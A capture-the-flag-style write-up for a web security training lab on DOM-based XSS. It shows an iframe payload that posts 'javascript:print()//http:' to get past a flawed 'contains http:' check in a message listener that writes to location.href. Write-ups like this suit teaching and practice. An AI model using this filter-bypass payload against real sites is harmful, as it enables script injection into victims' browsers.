# Lab 06 — DOM XSS using web messages and a JavaScript URL

> **Practitioner** · [Official lab](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-a-javascript-url)

**Entry point:** a `message` listener checks that the payload contains
`http:` (flawed `indexOf` check) before passing it to the `location.href`
sink.

## Solution

1. Satisfy the substring check **inside a comment** of the JavaScript URL:

```html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/"
        onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
</iframe>
```

2. Deliver to victim — `indexOf("http:")` finds it in the trailing comment,
   the whole string goes to `location.href`, and `print()` executes —
   lab solved.

## Notes

`javascript:print()//http:` — everything after `//` is a comment, so the
"must contain http:" filter validates nothing.
